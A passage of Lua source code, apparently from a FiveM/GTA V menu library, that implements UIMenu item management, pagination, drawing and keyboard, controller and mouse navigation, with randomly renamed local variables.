            Lk6piKcdTYjiN:Position((#self.Items * 25) - 37 + self.Subtitle.ExtraY)
            table.insert(self.Items, Lk6piKcdTYjiN)
            self:RecalculateDescriptionPosition()
            self:CurrentSelection(yYLkat_)
        end
    end
end
function UIMenu:GetItemAt(KFQynRaXzrhWpOK3f)
    return self.Items[KFQynRaXzrhWpOK3f]
end
function UIMenu:RemoveItemAt(zienocnDNJL1ngbiQBC)
    if tonumber(zienocnDNJL1ngbiQBC) then
        if self.Items[zienocnDNJL1ngbiQBC] then
            local FgU4_WRQE5HOvyi = self:CurrentSelection()
            if #self.Items > self.Pagination.Total and self.Pagination.Max == #self.Items - 1 then
                self.Pagination.Min = self.Pagination.Min - 1
                self.Pagination.Max = self.Pagination.Max + 1
            end
            table.remove(self.Items, tonumber(zienocnDNJL1ngbiQBC))
            self:RecalculateDescriptionPosition()
            self:CurrentSelection(FgU4_WRQE5HOvyi)
        end
    end
end
function UIMenu:RefreshIndex()
    if #self.Items == 0 then
        self.ActiveItem = 1000
        self.Pagination.Max = self.Pagination.Total + 1
        self.Pagination.Min = 0
        return
    end
    self.Items[self:CurrentSelection()]:Selected(false)
    self.ActiveItem = 1000 - (1000 % #self.Items)
    self.Pagination.Max = self.Pagination.Total + 1
    self.Pagination.Min = 0
    self.ReDraw = true
end
function UIMenu:Clear()
    self.Items = {}
    self.ReDraw = true
    self:RecalculateDescriptionPosition()
end
function UIMenu:MultilineFormat(cMXzzjw)
    if tostring(cMXzzjw) then
        local y1q6pPfsDdy6 = 425 + self.WidthOffset
        local Bk6PD0UQR8 = 0
        local p6WuTdBF23PM0QwkxA2 = ""
        local x5tSIlfc4i9jEe = string.split(tostring(cMXzzjw), " ")
        for i = 1, #x5tSIlfc4i9jEe do
            local pTzix4eE6 = MeasureStringWidth(x5tSIlfc4i9jEe[i], 0, 0.30)
            Bk6PD0UQR8 = Bk6PD0UQR8 + pTzix4eE6
            if Bk6PD0UQR8 > y1q6pPfsDdy6 then
                p6WuTdBF23PM0QwkxA2 = p6WuTdBF23PM0QwkxA2 .. "\n" .. x5tSIlfc4i9jEe[i] .. " "
                Bk6PD0UQR8 = pTzix4eE6 + MeasureString(" ")
            else
                p6WuTdBF23PM0QwkxA2 = p6WuTdBF23PM0QwkxA2 .. x5tSIlfc4i9jEe[i] .. " "
                Bk6PD0UQR8 = Bk6PD0UQR8 + MeasureString(" ")
            end
        end
        return p6WuTdBF23PM0QwkxA2
    end
end
function UIMenu:DrawCalculations()
    local ttbDf_PyVF = self:CalculateWindowHeight()
    if self.Settings.MultilineFormats then
        if self.Subtitle.Rectangle and not self.Subtitle.Formatted then
            self.Subtitle.Formatted = true
            self.Subtitle.Text:Text(self:MultilineFormat(self.Subtitle.Text:Text()))
            local TotSbo4tsPU9eVt2ED = #string.split(self.Subtitle.Text:Text(), "\n")
            self.Subtitle.ExtraY = ((TotSbo4tsPU9eVt2ED == 1) and 37 or ((TotSbo4tsPU9eVt2ED + 1) * 22))
            self.Subtitle.Rectangle:Size(431 + self.WidthOffset, self.Subtitle.ExtraY)
        end
    elseif self.Subtitle.Formatted then
        self.Subtitle.Formatted = false
        self.Subtitle.ExtraY = 37
        self.Subtitle.Rectangle:Size(431 + self.WidthOffset, self.Subtitle.ExtraY)
        self.Subtitle.Text:Text(self.Subtitle.BackupText)
    end
    self.Background:Size(
        431 + self.WidthOffset,
        self:CalculateItemHeight() + ttbDf_PyVF + ((self.Subtitle.ExtraY > 0) and 0 or 37)
    )
    self.Extra.Up:Size(431 + self.WidthOffset, 18)
    self.Extra.Down:Size(431 + self.WidthOffset, 18)
    local rdgUfi0n_7zCKZezG = 4
    self.Extra.Up:Position(
        self.Position.X,
        144 + self:CalculateItemHeight() + self.Position.Y + ttbDf_PyVF + rdgUfi0n_7zCKZezG
    )
    self.Extra.Down:Position(
        self.Position.X,
        144 + 18 + self:CalculateItemHeight() + self.Position.Y + ttbDf_PyVF + rdgUfi0n_7zCKZezG
    )
    if self.WidthOffset > 0 then
        self.ArrowSprite:Position(
            190 + self.Position.X + (self.WidthOffset / 2),
            141 + self:CalculateItemHeight() + self.Position.Y + ttbDf_PyVF + rdgUfi0n_7zCKZezG
        )
    else
        self.ArrowSprite:Position(
            190 + self.Position.X + self.WidthOffset,
            141 + self:CalculateItemHeight() + self.Position.Y + ttbDf_PyVF + rdgUfi0n_7zCKZezG
        )
    end
    self.ReDraw = false
    if #self.Items ~= 0 and self.Items[self:CurrentSelection()]:Description() ~= "" then
        self:RecalculateDescriptionPosition()
        local XonnYLFSL3G2R6ZvZrcoc = self.Items[self:CurrentSelection()]:Description()
        if self.Settings.MultilineFormats then
            self.Description.Text:Text(self:MultilineFormat(XonnYLFSL3G2R6ZvZrcoc))
        else
            self.Description.Text:Text(XonnYLFSL3G2R6ZvZrcoc)
        end
        local ZCK8w2Z = #string.split(self.Description.Text:Text(), "\n")
        self.Description.Rectangle:Size(431 + self.WidthOffset, ((ZCK8w2Z == 1) and 37 or ((ZCK8w2Z + 1) * 22)))
    end
end
function UIMenu:Visible(ePW)
    if ePW ~= nil then
        self._Visible = tobool(ePW)
        self.JustOpened = tobool(ePW)
        self.Dirty = tobool(ePW)
        self:UpdateScaleform()
        if self.ParentMenu ~= nil or tobool(ePW) == false then
            return
        end
        if self.Settings.ResetCursorOnOpen then
            local Z2BP0Pvf5DwNXMU_, hCwOEQ = GetScreenResolution()
            SetCursorLocation(Z2BP0Pvf5DwNXMU_ / 2, hCwOEQ / 2)
            SetCursorSprite(1)
        end
    else
        return self._Visible
    end
end
function UIMenu:ProcessControl()
    if not self._Visible then
        return
    end
    if self.JustOpened then
        self.JustOpened = false
        return
    end
    if
        self.Controls.Back.Enabled and
            (IsDisabledControlJustReleased(0, 202) or IsDisabledControlJustReleased(1, 202) or
                IsDisabledControlJustReleased(2, 202))
     then
        self:GoBack()
    end
    if #self.Items == 0 then
        return
    end
    if not self.UpPressed then
        if
            self.Controls.Up.Enabled and
                (IsDisabledControlJustPressed(0, 172) or IsDisabledControlJustPressed(1, 172) or
                    IsDisabledControlJustPressed(2, 172))
         then
            Citizen.CreateThread(
                function()
                    self.UpPressed = true
                    if #self.Items > self.Pagination.Total + 1 then
                        self:GoUpOverflow()
                    else
                        self:GoUp()
                    end
                    self:UpdateScaleform()
                    Citizen.Wait(175)
                    while self.Controls.Up.Enabled and
                        (IsDisabledControlPressed(0, 172) or IsDisabledControlPressed(1, 172) or
                            IsDisabledControlPressed(2, 172)) do
                        if #self.Items > self.Pagination.Total + 1 then
                            self:GoUpOverflow()
                        else
                            self:GoUp()
                        end
                        self:UpdateScaleform()
                        Citizen.Wait(125)
                    end
                    self.UpPressed = false
                end
            )
        end
    end
    if not self.DownPressed then
        if
            self.Controls.Down.Enabled and
                (IsDisabledControlJustPressed(0, 173) or IsDisabledControlJustPressed(1, 173) or
                    IsDisabledControlJustPressed(2, 173))
         then
            Citizen.CreateThread(
                function()
                    self.DownPressed = true
                    if #self.Items > self.Pagination.Total + 1 then
                        self:GoDownOverflow()
                    else
                        self:GoDown()
                    end
                    self:UpdateScaleform()
                    Citizen.Wait(175)
                    while self.Controls.Down.Enabled and
                        (IsDisabledControlPressed(0, 173) or IsDisabledControlPressed(1, 173) or
                            IsDisabledControlPressed(2, 173)) do
                        if #self.Items > self.Pagination.Total + 1 then
                            self:GoDownOverflow()
                        else
                            self:GoDown()
                        end
                        self:UpdateScaleform()
                        Citizen.Wait(125)
                    end
                    self.DownPressed = false
                end
            )
        end
    end
    if not self.LeftPressed then
        if
            self.Controls.Left.Enabled and
                (IsDisabledControlPressed(0, 174) or IsDisabledControlPressed(1, 174) or
                    IsDisabledControlPressed(2, 174))
         then
            local jWQp, bPXFXIafeS24WR4sLA = self.Items[self:CurrentSelection()]()
            Citizen.CreateThread(
                function()
                    if (bPXFXIafeS24WR4sLA == "UIMenuSliderHeritageItem") then
                        self.LeftPressed = true
                        self:GoLeft()
                        Citizen.Wait(40)
                        while self.Controls.Left.Enabled and
                            (IsDisabledControlPressed(0, 174) or IsDisabledControlPressed(1, 174) or
                                IsDisabledControlPressed(2, 174)) do
                            self:GoLeft()
                            Citizen.Wait(20)
                        end
                        self.LeftPressed = false
                    else
                        self.LeftPressed = true
                        self:GoLeft()
                        Citizen.Wait(175)
                        while self.Controls.Left.Enabled and
                            (IsDisabledControlPressed(0, 174) or IsDisabledControlPressed(1, 174) or
                                IsDisabledControlPressed(2, 174)) do
                            self:GoLeft()
                            Citizen.Wait(125)
                        end
                        self.LeftPressed = false
                    end
                end
            )
        end
    end
    if not self.RightPressed then
        if
            self.Controls.Right.Enabled and
                (IsDisabledControlPressed(0, 175) or IsDisabledControlPressed(1, 175) or
                    IsDisabledControlPressed(2, 175))
         then
            Citizen.CreateThread(
                function()
                    local Kj5SY7D1uy, omL = self.Items[self:CurrentSelection()]()
                    if (omL == "UIMenuSliderHeritageItem") then
                        self.RightPressed = true
                        self:GoRight()
                        Citizen.Wait(40)
                        while self.Controls.Right.Enabled and
                            (IsDisabledControlPressed(0, 175) or IsDisabledControlPressed(1, 175) or
                                IsDisabledControlPressed(2, 175)) do
                            self:GoRight()
                            Citizen.Wait(20)
                        end
                        self.RightPressed = false
                    else
                        self.RightPressed = true
                        self:GoRight()
                        Citizen.Wait(175)
                        while self.Controls.Right.Enabled and
                            (IsDisabledControlPressed(0, 175) or IsDisabledControlPressed(1, 175) or
                                IsDisabledControlPressed(2, 175)) do
                            self:GoRight()
                            Citizen.Wait(125)
                        end
                        self.RightPressed = false
                    end
                end
            )
        end
    end
    if
        self.Controls.Select.Enabled and
            (IsDisabledControlJustPressed(0, 201) or IsDisabledControlJustPressed(1, 201) or
                IsDisabledControlJustPressed(2, 201))
     then
        self:SelectItem()
    end
end
function UIMenu:GoUpOverflow()
    if #self.Items <= self.Pagination.Total + 1 then
        return
    end
    if self:CurrentSelection() <= self.Pagination.Min + 1 then
        if self:CurrentSelection() == 1 then
            self.Pagination.Min = #self.Items - (self.Pagination.Total + 1)
            self.Pagination.Max = #self.Items
            self.Items[self:CurrentSelection()]:Selected(false)
            self.ActiveItem = 1000 - (1000 % #self.Items)
            self.ActiveItem = self.ActiveItem + (#self.Items - 1)
            self.Items[self:CurrentSelection()]:Selected(true)
        else
            self.Pagination.Min = self.Pagination.Min - 1
            self.Pagination.Max = self.Pagination.Max - 1
            self.Items[self:CurrentSelection()]:Selected(false)
            self.ActiveItem = self.ActiveItem - 1
            self.Items[self:CurrentSelection()]:Selected(true)
        end
    else
        self.Items[self:CurrentSelection()]:Selected(false)
        self.ActiveItem = self.ActiveItem - 1
        self.Items[self:CurrentSelection()]:Selected(true)
    end
    PlaySoundFrontend(-1, self.Settings.Audio.UpDown, self.Settings.Audio.Library, true)
    self.OnIndexChange(self, self:CurrentSelection())
    self.ReDraw = true
end
function UIMenu:GoUp()
    if #self.Items > self.Pagination.Total + 1 then
        return
    end
    self.Items[self:CurrentSelection()]:Selected(false)
    self.ActiveItem = self.ActiveItem - 1
    self.Items[self:CurrentSelection()]:Selected(true)
    PlaySoundFrontend(-1, self.Settings.Audio.UpDown, self.Settings.Audio.Library, true)
    self.OnIndexChange(self, self:CurrentSelection())
    self.ReDraw = true
end
function UIMenu:GoDownOverflow()
    if #self.Items <= self.Pagination.Total + 1 then
        return
    end
    if self:CurrentSelection() >= self.Pagination.Max then
        if self:CurrentSelection() == #self.Items then
            self.Pagination.Min = 0
            self.Pagination.Max = self.Pagination.Total + 1
            self.Items[self:CurrentSelection()]:Selected(false)
            self.ActiveItem = 1000 - (1000 % #self.Items)
            self.Items[self:CurrentSelection()]:Selected(true)
        else
            self.Pagination.Max = self.Pagination.Max + 1
            self.Pagination.Min = self.Pagination.Max - (self.Pagination.Total + 1)
            self.Items[self:CurrentSelection()]:Selected(false)
            self.ActiveItem = self.ActiveItem + 1
            self.Items[self:CurrentSelection()]:Selected(true)
        end
    else
        self.Items[self:CurrentSelection()]:Selected(false)
        self.ActiveItem = self.ActiveItem + 1
        self.Items[self:CurrentSelection()]:Selected(true)
    end
    PlaySoundFrontend(-1, self.Settings.Audio.UpDown, self.Settings.Audio.Library, true)
    self.OnIndexChange(self, self:CurrentSelection())
    self.ReDraw = true
end
function UIMenu:GoDown()
    if #self.Items > self.Pagination.Total + 1 then
        return
    end
    self.Items[self:CurrentSelection()]:Selected(false)
    self.ActiveItem = self.ActiveItem + 1
    self.Items[self:CurrentSelection()]:Selected(true)
    PlaySoundFrontend(-1, self.Settings.Audio.UpDown, self.Settings.Audio.Library, true)
    self.OnIndexChange(self, self:CurrentSelection())
    self.ReDraw = true
end
function UIMenu:GoLeft()
    local Te6CEGLDg3, e1lDMoXr6rzd = self.Items[self:CurrentSelection()]()
    if
        e1lDMoXr6rzd ~= "UIMenuListItem" and e1lDMoXr6rzd ~= "UIMenuSliderItem" and e1lDMoXr6rzd ~= "UIMenuProgressItem" and
            e1lDMoXr6rzd ~= "UIMenuSliderHeritageItem" and
            e1lDMoXr6rzd ~= "UIMenuSliderProgressItem"
     then
        return
    end
    if not self.Items[self:CurrentSelection()]:Enabled() then
        PlaySoundFrontend(-1, self.Settings.Audio.Error, self.Settings.Audio.Library, true)
        return
    end
    if e1lDMoXr6rzd == "UIMenuListItem" then
        local A3Ab46K14Im43 = self.Items[self:CurrentSelection()]
        A3Ab46K14Im43:Index(A3Ab46K14Im43._Index - 1)
        self.OnListChange(self, A3Ab46K14Im43, A3Ab46K14Im43._Index)
        A3Ab46K14Im43.OnListChanged(self, A3Ab46K14Im43, A3Ab46K14Im43._Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif e1lDMoXr6rzd == "UIMenuSliderItem" then
        local gbBTBCHA19JZDh4h = self.Items[self:CurrentSelection()]
        gbBTBCHA19JZDh4h:Index(gbBTBCHA19JZDh4h._Index - 1)
        self.OnSliderChange(self, gbBTBCHA19JZDh4h, gbBTBCHA19JZDh4h:Index())
        gbBTBCHA19JZDh4h.OnSliderChanged(self, gbBTBCHA19JZDh4h, gbBTBCHA19JZDh4h._Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif e1lDMoXr6rzd == "UIMenuSliderProgressItem" then
        local dBJVzJtqvWtiNj = self.Items[self:CurrentSelection()]
        dBJVzJtqvWtiNj:Index(dBJVzJtqvWtiNj._Index - 1)
        self.OnSliderChange(self, dBJVzJtqvWtiNj, dBJVzJtqvWtiNj:Index())
        dBJVzJtqvWtiNj.OnSliderChanged(self, dBJVzJtqvWtiNj, dBJVzJtqvWtiNj._Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif e1lDMoXr6rzd == "UIMenuProgressItem" then
        local LSoDojbdmZB5o9fBcC = self.Items[self:CurrentSelection()]
        LSoDojbdmZB5o9fBcC:Index(LSoDojbdmZB5o9fBcC.Data.Index - 1)
        self.OnProgressChange(self, LSoDojbdmZB5o9fBcC, LSoDojbdmZB5o9fBcC.Data.Index)
        LSoDojbdmZB5o9fBcC.OnProgressChanged(self, LSoDojbdmZB5o9fBcC, LSoDojbdmZB5o9fBcC.Data.Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif e1lDMoXr6rzd == "UIMenuSliderHeritageItem" then
        local fnyG = self.Items[self:CurrentSelection()]
        fnyG:Index(fnyG._Index - 0.1)
        self.OnSliderChange(self, fnyG, fnyG:Index())
        fnyG.OnSliderChanged(self, fnyG, fnyG._Index)
        if not fnyG.Pressed then
            fnyG.Pressed = true
            Citizen.CreateThread(
                function()
                    fnyG.Audio.Id = GetSoundId()
                    PlaySoundFrontend(fnyG.Audio.Id, fnyG.Audio.Slider, fnyG.Audio.Library, 1)
                    Citizen.Wait(100)
                    StopSound(fnyG.Audio.Id)
                    ReleaseSoundId(fnyG.Audio.Id)
                    fnyG.Pressed = false
                end
            )
        end
    end
end
function UIMenu:GoRight()
    local lMXKQJ, He7 = self.Items[self:CurrentSelection()]()
    if
        He7 ~= "UIMenuListItem" and He7 ~= "UIMenuSliderItem" and He7 ~= "UIMenuProgressItem" and
            He7 ~= "UIMenuSliderHeritageItem" and
            He7 ~= "UIMenuSliderProgressItem"
     then
        return
    end
    if not self.Items[self:CurrentSelection()]:Enabled() then
        PlaySoundFrontend(-1, self.Settings.Audio.Error, self.Settings.Audio.Library, true)
        return
    end
    if He7 == "UIMenuListItem" then
        local srXvChP8Ssmh = self.Items[self:CurrentSelection()]
        srXvChP8Ssmh:Index(srXvChP8Ssmh._Index + 1)
        self.OnListChange(self, srXvChP8Ssmh, srXvChP8Ssmh._Index)
        srXvChP8Ssmh.OnListChanged(self, srXvChP8Ssmh, srXvChP8Ssmh._Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif He7 == "UIMenuSliderItem" then
        local yipkjWwmXhe_jghPq2W6 = self.Items[self:CurrentSelection()]
        yipkjWwmXhe_jghPq2W6:Index(yipkjWwmXhe_jghPq2W6._Index + 1)
        self.OnSliderChange(self, yipkjWwmXhe_jghPq2W6, yipkjWwmXhe_jghPq2W6:Index())
        yipkjWwmXhe_jghPq2W6.OnSliderChanged(self, yipkjWwmXhe_jghPq2W6, yipkjWwmXhe_jghPq2W6._Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif He7 == "UIMenuSliderProgressItem" then
        local _GestJ = self.Items[self:CurrentSelection()]
        _GestJ:Index(_GestJ._Index + 1)
        self.OnSliderChange(self, _GestJ, _GestJ:Index())
        _GestJ.OnSliderChanged(self, _GestJ, _GestJ._Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif He7 == "UIMenuProgressItem" then
        local oaC8 = self.Items[self:CurrentSelection()]
        oaC8:Index(oaC8.Data.Index + 1)
        self.OnProgressChange(self, oaC8, oaC8.Data.Index)
        oaC8.OnProgressChanged(self, oaC8, oaC8.Data.Index)
        PlaySoundFrontend(-1, self.Settings.Audio.LeftRight, self.Settings.Audio.Library, true)
    elseif He7 == "UIMenuSliderHeritageItem" then
        local rkSX5GS6kF7Uo8 = self.Items[self:CurrentSelection()]
        rkSX5GS6kF7Uo8:Index(rkSX5GS6kF7Uo8._Index + 0.1)
        self.OnSliderChange(self, rkSX5GS6kF7Uo8, rkSX5GS6kF7Uo8:Index())
        rkSX5GS6kF7Uo8.OnSliderChanged(self, rkSX5GS6kF7Uo8, rkSX5GS6kF7Uo8._Index)
        if not rkSX5GS6kF7Uo8.Pressed then
            rkSX5GS6kF7Uo8.Pressed = true
            Citizen.CreateThread(
                function()
                    rkSX5GS6kF7Uo8.Audio.Id = GetSoundId()
                    PlaySoundFrontend(
                        rkSX5GS6kF7Uo8.Audio.Id,
                        rkSX5GS6kF7Uo8.Audio.Slider,
                        rkSX5GS6kF7Uo8.Audio.Library,
                        1
                    )
                    Citizen.Wait(100)
                    StopSound(rkSX5GS6kF7Uo8.Audio.Id)
                    ReleaseSoundId(rkSX5GS6kF7Uo8.Audio.Id)
                    rkSX5GS6kF7Uo8.Pressed = false
                end
            )
        end
    end
end
function UIMenu:SelectItem()
    if not self.Items[self:CurrentSelection()]:Enabled() then
        PlaySoundFrontend(-1, self.Settings.Audio.Error, self.Settings.Audio.Library, true)
        return
    end
    local lEUdC4vZXh = self.Items[self:CurrentSelection()]
    local o499Amq605, yTCzpQfdZ6P2 = lEUdC4vZXh()
    if yTCzpQfdZ6P2 == "UIMenuCheckboxItem" then
        lEUdC4vZXh.Checked = not lEUdC4vZXh.Checked
        PlaySoundFrontend(-1, self.Settings.Audio.Select, self.Settings.Audio.Library, true)
        self.OnCheckboxChange(self, lEUdC4vZXh, lEUdC4vZXh.Checked)
        lEUdC4vZXh.CheckboxEvent(self, lEUdC4vZXh, lEUdC4vZXh.Checked)
    elseif yTCzpQfdZ6P2 == "UIMenuListItem" then
        PlaySoundFrontend(-1, self.Settings.Audio.Select, self.Settings.Audio.Library, true)
        self.OnListSelect(self, lEUdC4vZXh, lEUdC4vZXh._Index)
        lEUdC4vZXh.OnListSelected(self, lEUdC4vZXh, lEUdC4vZXh._Index)
    elseif yTCzpQfdZ6P2 == "UIMenuSliderItem" then
        PlaySoundFrontend(-1, self.Settings.Audio.Select, self.Settings.Audio.Library, true)
        self.OnSliderSelect(self, lEUdC4vZXh, lEUdC4vZXh._Index)
        lEUdC4vZXh.OnSliderSelected(lEUdC4vZXh._Index)
    elseif yTCzpQfdZ6P2 == "UIMenuSliderProgressItem" then
        PlaySoundFrontend(-1, self.Settings.Audio.Select, self.Settings.Audio.Library, true)
        self.OnSliderSelect(self, lEUdC4vZXh, lEUdC4vZXh._Index)
        lEUdC4vZXh.OnSliderSelected(lEUdC4vZXh._Index)
    elseif yTCzpQfdZ6P2 == "UIMenuProgressItem" then
        PlaySoundFrontend(-1, self.Settings.Audio.Select, self.Settings.Audio.Library, true)
        self.OnProgressSelect(self, lEUdC4vZXh, lEUdC4vZXh.Data.Index)
        lEUdC4vZXh.OnProgressSelected(lEUdC4vZXh.Data.Index)
    elseif yTCzpQfdZ6P2 == "UIMenuSliderHeritageItem" then
        PlaySoundFrontend(-1, self.Settings.Audio.Select, self.Settings.Audio.Library, true)
        self.OnSliderSelect(self, lEUdC4vZXh, lEUdC4vZXh._Index)
        lEUdC4vZXh.OnSliderSelected(lEUdC4vZXh._Index)
    else
        PlaySoundFrontend(-1, self.Settings.Audio.Select, self.Settings.Audio.Library, true)
        self.OnItemSelect(self, lEUdC4vZXh, self:CurrentSelection())
        lEUdC4vZXh.Activated(self, lEUdC4vZXh)
        if not self.Children[lEUdC4vZXh] then
            return
        end
        self:Visible(false)
        self.Children[lEUdC4vZXh]:Visible(true)
        self.OnMenuChanged(self, self.Children[self.Items[self:CurrentSelection()]], true)
    end
end
function UIMenu:GoBack()
    PlaySoundFrontend(-1, self.Settings.Audio.Back, self.Settings.Audio.Library, true)
    self:Visible(false)
    if self.ParentMenu ~= nil then
        self.ParentMenu:Visible(true)
        self.OnMenuChanged(self, self.ParentMenu, false)
        if self.Settings.ResetCursorOnOpen then
            local AAjzJcIdSXnN6n, zddLR2cxj4_kCUY8l = GetActiveScreenResolution()
            SetCursorLocation(AAjzJcIdSXnN6n / 2, zddLR2cxj4_kCUY8l / 2)
        end
    end
    self.OnMenuClosed(self)
end
function UIMenu:BindMenuToItem(FrRsI_WQDTT, QKuNM9E8Jjf)
    if FrRsI_WQDTT() == "UIMenu" and QKuNM9E8Jjf() == "UIMenuItem" then
        FrRsI_WQDTT.ParentMenu = self
        FrRsI_WQDTT.ParentItem = QKuNM9E8Jjf
        self.Children[QKuNM9E8Jjf] = FrRsI_WQDTT
    end
end
function UIMenu:ReleaseMenuFromItem(WlMrsKaw1VC9e3)
    if WlMrsKaw1VC9e3() == "UIMenuItem" then
        if not self.Children[WlMrsKaw1VC9e3] then
            return false
        end
        self.Children[WlMrsKaw1VC9e3].ParentMenu = nil
        self.Children[WlMrsKaw1VC9e3].ParentItem = nil
        self.Children[WlMrsKaw1VC9e3] = nil
        return true
    end
end
function UIMenu:PageCounterName(ratSSvHhmHqMc2)
    self.PageCounter.isCustom = true
    self.PageCounter.PreText = ratSSvHhmHqMc2
    self.PageCounter.Text:Text(self.PageCounter.PreText)
    self.PageCounter.Text:Draw()
end
function UIMenu:Draw()
    if not self._Visible then
        return
    end
    HideHudComponentThisFrame(19)
    if self.Settings.ControlDisablingEnabled then
        self:DisEnableControls(false)
    end
    if self.Settings.InstructionalButtons then
        DrawScaleformMovieFullscreen(self.InstructionalScaleform, 255, 255, 255, 255, 0)
    end
    if self.Settings.ScaleWithSafezone then
        ScreenDrawPositionBegin(76, 84)
        ScreenDrawPositionRatio(0, 0, 0, 0)
    end
    if self.ReDraw then
        self:DrawCalculations()
    end
    if self.Logo then
        self.Logo:Draw()
    elseif self.Banner then
        self.Banner:Draw()
    end
    self.Title:Draw()
    if self.Subtitle.Rectangle then
        self.Subtitle.Rectangle:Draw()
        self.Subtitle.Text:Draw()
    end
    if #self.Items ~= 0 or #self.Windows ~= 0 then
        self.Background:Draw()
    end
    if #self.Windows ~= 0 then
        local kLHqiuKqhnFvSna = 0
        for index = 1, #self.Windows do
            if self.Windows[index - 1] then
                kLHqiuKqhnFvSna = kLHqiuKqhnFvSna + self.Windows[index - 1].Background:Size().Height
            end
            local VjNQ6ORO = self.Windows[index]
            VjNQ6ORO:Position(kLHqiuKqhnFvSna + self.Subtitle.ExtraY - 37)
            VjNQ6ORO:Draw()
        end
    end
    if #self.Items == 0 then
        if self.Settings.ScaleWithSafezone then
            ScreenDrawPositionEnd()
        end
        return
    end
    local iVq = self:CurrentSelection()
    self.Items[iVq]:Selected(true)
    if self.Items[iVq]:Description() ~= "" then
        self.Description.Bar:Draw()
        self.Description.Rectangle:Draw()
        self.Description.Text:Draw()
    end
    if self.Items[iVq].Panels ~= nil then
        if #self.Items[iVq].Panels ~= 0 then
            local h1Xgh7x8NjVtoOS = self:CaclulatePanelPosition(self.Items[iVq]:Description() ~= "")
            for index = 1, #self.Items[iVq].Panels do
                if self.Items[iVq].Panels[index - 1] then
                    h1Xgh7x8NjVtoOS = h1Xgh7x8NjVtoOS + self.Items[iVq].Panels[index - 1].Background:Size().Height + 5
                end
                self.Items[iVq].Panels[index]:Position(h1Xgh7x8NjVtoOS)
                self.Items[iVq].Panels[index]:Draw()
            end
        end
    end
    local hCKEAhE64l = self:CalculateWindowHeight()
    if #self.Items <= self.Pagination.Total + 1 then
        local eX8leLbk_Ikmx9NAHjq = self.Subtitle.ExtraY - 37 + hCKEAhE64l
        for index = 1, #self.Items do
            local llK = self.Items[index]
            llK:Position(eX8leLbk_Ikmx9NAHjq)
            llK:Draw()
            eX8leLbk_Ikmx9NAHjq = eX8leLbk_Ikmx9NAHjq + self:CalculateItemHeightOffset(llK)
        end
    else
        local oE5V = self.Subtitle.ExtraY - 37 + hCKEAhE64l
        for index = self.Pagination.Min + 1, self.Pagination.Max, 1 do
            if self.Items[index] then
                local Vgq_wAxKEhyaUv = self.Items[index]
                Vgq_wAxKEhyaUv:Position(oE5V)
                Vgq_wAxKEhyaUv:Draw()
                oE5V = oE5V + self:CalculateItemHeightOffset(Vgq_wAxKEhyaUv)
            end
        end
        self.Extra.Up:Draw()
        self.Extra.Down:Draw()
        self.ArrowSprite:Draw()
        if self.PageCounter.isCustom ~= true then
            if self.PageCounter.Text ~= nil then
                local atUB1 = self.PageCounter.PreText .. iVq .. " / " .. #self.Items
                self.PageCounter.Text:Text(atUB1)
                self.PageCounter.Text:Draw()
            end
        end
    end
    if self.PageCounter.isCustom ~= false then
        if self.PageCounter.Text ~= nil then
            self.PageCounter.Text:Text(self.PageCounter.PreText)
            self.PageCounter.Text:Draw()
        end
    end
    if self.Settings.ScaleWithSafezone then
        ScreenDrawPositionEnd()
    end
end
function UIMenu:ProcessMouse()
    if
        not self._Visible or self.JustOpened or #self.Items == 0 or tobool(Controller()) or
            not self.Settings.MouseControlsEnabled
     then
        EnableControlAction(0, 2, true)
        EnableControlAction(0, 1, true)
        if self.Dirty then
            for FPZqxWZ, vFs3pbn in pairs(self.Items) do
                if vFs3pbn:Hovered() then
                    vFs3pbn:Hovered(false)
                end
            end
        end
        return
    end
    local mUkQWEYL4 = {X = 0, Y = 0}
    local _aZ9mNDi1tkwLqoSFWK = self:CalculateWindowHeight()
    if self.Settings.ScaleWithSafezone then
        mUkQWEYL4 = GetSafeZoneBounds()
    end
    local kuzf0nug_vi0NKhS = #self.Items
    local UGfNDSUmsB2 = 0
    ShowCursorThisFrame()
    if #self.Items > self.Pagination.Total + 1 then
        kuzf0nug_vi0NKhS = self.Pagination.Max
    end
    if IsMouseInBounds(0, 0, 30, 1080) and self.Settings.MouseEdgeEnabled then
        SetGameplayCamRelativeHeading(GetGameplayCamRelativeHeading() + 5)
        SetCursorSprite(6)
    elseif IsMouseInBounds(1920 - 30, 0, 30, 1080) and self.Settings.MouseEdgeEnabled then
        SetGameplayCamRelativeHeading(GetGameplayCamRelativeHeading() - 5)
        SetCursorSprite(7)
    elseif self.Settings.MouseEdgeEnabled then
        SetCursorSprite(1)
    end
    for i = self.Pagination.Min + 1, kuzf0nug_vi0NKhS, 1 do
        local zjEWfBRCo0, PFV_hUQXjN =
            self.Position.X + mUkQWEYL4.X,
            self.Position.Y + 144 - 37 + self.Subtitle.ExtraY + UGfNDSUmsB2 + mUkQWEYL4.Y + _aZ9mNDi1tkwLqoSFWK
        local eM5sVOtp55zHPbUWoa = self.Items[i]
        local UI2sNV4qyvu6C, xbZwq = eM5sVOtp55zHPbUWoa()
        local BFheVGHlATeW65fJrnK6, c0E = 431 + self.WidthOffset, self:CalculateItemHeightOffset(eM5sVOtp55zHPbUWoa)
        if IsMouseInBounds(zjEWfBRCo0, PFV_hUQXjN, BFheVGHlATeW65fJrnK6, c0E) then
            eM5sVOtp55zHPbUWoa:Hovered(true)
            if not self.Controls.MousePressed then
                if IsDisabledControlJustPressed(0, 24) then
                    Citizen.CreateThread(
                        function()
                            local MeTEwoGzMOw, sMsHT, mnCjb22ljXKJsnQP5Czwe, Acjc6bIf9W6 =
                                zjEWfBRCo0,
                                PFV_hUQXjN,
                                BFheVGHlATeW65fJrnK6,
                                c0E
                            self.Controls.MousePressed = true
                            if eM5sVOtp55zHPbUWoa:Selected() and eM5sVOtp55zHPbUWoa:Enabled() then
                                if xbZwq == "UIMenuListItem" then
                                    if
                                        IsMouseInBounds(
                                            eM5sVOtp55zHPbUWoa.LeftArrow.X + mUkQWEYL4.X,
